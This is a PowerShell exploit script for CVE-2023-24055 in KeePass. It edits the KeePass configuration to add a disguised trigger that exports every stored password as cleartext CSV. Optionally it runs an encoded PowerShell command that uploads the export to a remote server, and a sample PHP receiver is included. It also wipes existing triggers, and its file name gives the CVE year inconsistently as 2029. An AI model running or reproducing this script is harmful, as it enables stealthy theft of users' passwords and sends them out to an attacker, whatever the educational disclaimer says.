<#
    Disclaimer:
    This script is for educational and demonstration purposes only. The author does not endorse or condone the use of this script for any criminal or malicious activities and it should only be used where explicitly allowed with proper permission.

    WARNING: 
    This script should be used with extreme caution, as it will alter the KeePass configuration file, delete any previously configured triggers, and may result in unexpected behavior and potentially break the KeePass application. Use of this script is at your own risk.

    Introduction: 
    This script exploits the vulnerability of KeePass versions up to 2.53 (in a default installation) by allowing an attacker with write access to the XML configuration file to obtain the cleartext passwords by adding an export trigger. Note that the vendor's position is that the password database is not intended to be secure against an attacker who has that level of access to the local PC.

    Reference: 
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24055
    - https://www.bleepingcomputer.com/news/security/keepass-disputes-vulnerability-allowing-stealthy-password-theft/
    
    Author: Ag3nt047
    Date of Creation: 01/02/2023

    Instructions:
    To use this script, run it in PowerShell and provide the necessary parameters. The mandatory parameters are:
    -filename: The full file path and name of the file to be used for the exported passwords.

    The optional parameters are:
    -uploadURL: A switch to specify that the data should be uploaded to a specified URL. 
    -url: The URL to which the data should be uploaded.

    Example Usage:
    Export cleartext passwords:
    .\CVE-2029-24055.ps1 -filename c:\windows\tasks\export.txt

    Export cleartext passwords and upload to web server:
    .\CVE-2029-24055.ps1 -filename c:\windows\tasks\export.txt -uploadURL http://192.168.238.141/KeePass/upload.php

    Example PHP file for webserver:
    <?php
    if (!empty($_POST['filename']) && !empty($_POST['data'])) {
    $target_directory = '/var/www/html/KeePass/uploads/';
    $filename = $target_directory . $_POST['filename'];
    $data = base64_decode($_POST['data']);
    file_put_contents($filename, $data);
    }
    ?>

    Credits: 
    - Script initially based off code found in https://github.com/GhostPack/KeeThief/blob/master/PowerShell/KeePassConfig.ps1
    - Idea of exfiltrating the export is credited to https://github.com/alt3kx/CVE-2023-24055_PoC.

#>

# Parameters
param (
  [string]$filename,
  [switch]$uploadURL,
  [string]$url
)

# Check that the script is running on Windows
if ($env:OS -ne 'Windows_NT') {
  Write-Output 'Sorry, to be run on Windows only!'
  exit 1
}

# Get path to the default configuration file
$APPDATA = [Environment]::GetEnvironmentVariable("APPDATA")
$config_File = "$APPDATA\KeePass\KeePass.config.xml" 

# Load the XML file into the $xml object
$xml = [xml](Get-Content $config_File)

# Remove previous Triggers
$xml.SelectNodes("//Triggers").RemoveAll() 
$xml.Save($config_File)

# Export commands
if (-not $filename) {
  Write-Output "Error: Filename is a mandatory parameter.`nExample: .\CVE-2029-24055v1.ps1 -filename c:\windows\tasks\export.txt"
  exit 1
}

Write-Output "Using sepecified filename for export $filename"
$exportCommands = '<Parameter>' + $filename + '</Parameter>'

# Upload commands
$uploadCommands = ""
$uploadAction = ""

if ($uploadURL.IsPresent) {
  if (-not $url) {
    Write-Output "Error: URL must be specified with the -uploadURL switch"
    exit 1
  }
  
  Write-Output "Using sepecified URL for upload $url"
  
  $upload = '$file=[System.IO.Path]::GetFileName("'+$filename+'");$encodedFile=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([System.IO.File]::ReadAllText("'+$filename+'")));$http=New-Object System.Net.WebClient;$http.Headers.Add("Content-Type","application/x-www-form-urlencoded");$http.UploadString("'+$url+'","filename=$file&data=$encodedFile");'
  $bytes = [Text.Encoding]::Unicode.GetBytes($upload)
  $encodedCommands = [Convert]::ToBase64String($bytes)
  $uploadCommands = '<Parameter>-ex bypass -noprofile -EncodedCommand ' + $encodedCommands +'</Parameter>'

  # Trigger - upload
  $uploadAction = "
    <Action>
    <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
    <Parameters>
    <Parameter>PowerShell.exe</Parameter>
    $uploadCommands
    <Parameter>False</Parameter>
    <Parameter>1</Parameter>
    <Parameter />
    </Parameters>
  </Action>"

}

# Trigger - export
$TriggerXML = [xml] @"
<Trigger>
    <Guid>$([Convert]::ToBase64String([guid]::NewGuid().ToByteArray()))</Guid>
    <Name>Offline notepad style backup of passwords</Name>
    <Events>
        <Event>
            <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
            <Parameters>
                <Parameter>0</Parameter>
                <Parameter />
            </Parameters>
        </Event>
    </Events>
    <Conditions />
    <Actions>
        <Action>
            <TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
            <Parameters>
  $exportCommands
                <Parameter>KeePass CSV (1.x)</Parameter>
                <Parameter />
                <Parameter />
            </Parameters>
        </Action>
  $uploadAction
    </Actions>
</Trigger>
"@


Write-Output "KeePass XML set to export database to $config_File"

ForEach($Object in $config_File) {
  if($Object -is [String]) {
    $KeePassXMLPath = $Object
  }
  elseif ($Object.PSObject.Properties['KeePassConfigPath']) {
    $KeePassXMLPath = [String]$Object.KeePassConfigPath
  }
  elseif ($Object.PSObject.Properties['Path']) {
    $KeePassXMLPath = [String]$Object.Path
  }
  elseif ($Object.PSObject.Properties['FullName']) {
    $KeePassXMLPath = [String]$Object.FullName
  }
  else {
    $KeePassXMLPath = [String]$Object
  }

  if($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath) ) {
    $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath

    $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
                
    $null = [GUID]::NewGuid().ToByteArray()

    if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -is [String]) {
      $Triggers = $KeePassXML.CreateElement('Triggers')
      $Null = $Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
      $Null = $KeePassXML.Configuration.Application.TriggerSystem.ReplaceChild($Triggers, $KeePassXML.Configuration.Application.TriggerSystem.SelectSingleNode('Triggers'))
    }
    else {
      $Null = $KeePassXML.Configuration.Application.TriggerSystem.Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
    }

    $KeePassXML.Save($KeePassXMLPath)

    Write-Output "Done!"
  }
}